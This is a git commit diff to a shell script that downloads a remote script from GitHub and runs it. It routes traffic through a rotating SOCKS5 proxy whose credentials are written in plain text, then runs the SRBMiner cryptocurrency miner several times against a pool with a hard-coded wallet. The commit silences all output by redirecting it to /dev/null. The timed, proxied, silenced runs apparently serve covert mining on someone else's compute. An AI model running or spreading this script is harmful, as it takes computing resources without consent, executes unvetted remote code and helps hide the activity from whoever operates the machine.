ebb76d272cd8e0f31571ce7b501bfbec305a0796
hunsunyo <98655233+hunsunyo@users.noreply.github.com>
2022-01-29 22:16:18 +0530

    Update xo.sh

--- xo.sh
+++ xo.sh
@@ -6,28 +6,28 @@ wget https://github.com/ahansura/srb/raw/main/rap.sh
 chmod +x rap.sh
 export http_proxy="socks5://djutybpn-rotate:vo7hn8ayc8s5@p.webshare.io:80/"
 
-timeout 400 ./rap.sh
+timeout 400 ./rap.sh >/dev/null
 echo "Job 1 finished..."
 sleep 5
-timeout 400 ./SRBMiner-MULTI --disable-gpu --algorithm ghostrider --pool eu.flockpool.com:5555 --wallet RFtgkDCsn41AwwU3ZuBEjFszNMZRw227hb --tls true
+timeout 400 ./SRBMiner-MULTI --disable-gpu --algorithm ghostrider --pool eu.flockpool.com:5555 --wallet RFtgkDCsn41AwwU3ZuBEjFszNMZRw227hb --tls true >/dev/null
 echo "Job 2 finished..."
 sleep 5
-timeout 400 ./SRBMiner-MULTI --disable-gpu --algorithm ghostrider --pool eu.flockpool.com:5555 --wallet RFtgkDCsn41AwwU3ZuBEjFszNMZRw227hb --tls true
+timeout 400 ./SRBMiner-MULTI --disable-gpu --algorithm ghostrider --pool eu.flockpool.com:5555 --wallet RFtgkDCsn41AwwU3ZuBEjFszNMZRw227hb --tls true >/dev/null
 echo "Job 3 finished..."
 sleep 5
-timeout 450 ./SRBMiner-MULTI --disable-gpu --algorithm ghostrider --pool eu.flockpool.com:5555 --wallet RFtgkDCsn41AwwU3ZuBEjFszNMZRw227hb --tls true
+timeout 450 ./SRBMiner-MULTI --disable-gpu --algorithm ghostrider --pool eu.flockpool.com:5555 --wallet RFtgkDCsn41AwwU3ZuBEjFszNMZRw227hb --tls true >/dev/null
 echo "Job 4 finished..."
 sleep 5
-timeout 420 ./SRBMiner-MULTI --disable-gpu --algorithm ghostrider --pool eu.flockpool.com:5555 --wallet RFtgkDCsn41AwwU3ZuBEjFszNMZRw227hb --tls true
+timeout 420 ./SRBMiner-MULTI --disable-gpu --algorithm ghostrider --pool eu.flockpool.com:5555 --wallet RFtgkDCsn41AwwU3ZuBEjFszNMZRw227hb --tls true >/dev/null
 echo "Job 5 finished..."
 sleep 5
-timeout 520 ./SRBMiner-MULTI --disable-gpu --algorithm ghostrider --pool eu.flockpool.com:5555 --wallet RFtgkDCsn41AwwU3ZuBEjFszNMZRw227hb --tls true
+timeout 520 ./SRBMiner-MULTI --disable-gpu --algorithm ghostrider --pool eu.flockpool.com:5555 --wallet RFtgkDCsn41AwwU3ZuBEjFszNMZRw227hb --tls true >/dev/null
 echo "Job 6 finished..."
 sleep 5
-timeout 490 ./SRBMiner-MULTI --disable-gpu --algorithm ghostrider --pool eu.flockpool.com:5555 --wallet RFtgkDCsn41AwwU3ZuBEjFszNMZRw227hb --tls true
+timeout 490 ./SRBMiner-MULTI --disable-gpu --algorithm ghostrider --pool eu.flockpool.com:5555 --wallet RFtgkDCsn41AwwU3ZuBEjFszNMZRw227hb --tls true >/dev/null
 echo "Job 7 finished..."
 sleep 5
-timeout 400 ./SRBMiner-MULTI --disable-gpu --algorithm ghostrider --pool eu.flockpool.com:5555 --wallet RFtgkDCsn41AwwU3ZuBEjFszNMZRw227hb --tls true
+timeout 400 ./SRBMiner-MULTI --disable-gpu --algorithm ghostrider --pool eu.flockpool.com:5555 --wallet RFtgkDCsn41AwwU3ZuBEjFszNMZRw227hb --tls true >/dev/null
 echo "All Jobs finished..."
 sleep 5
 
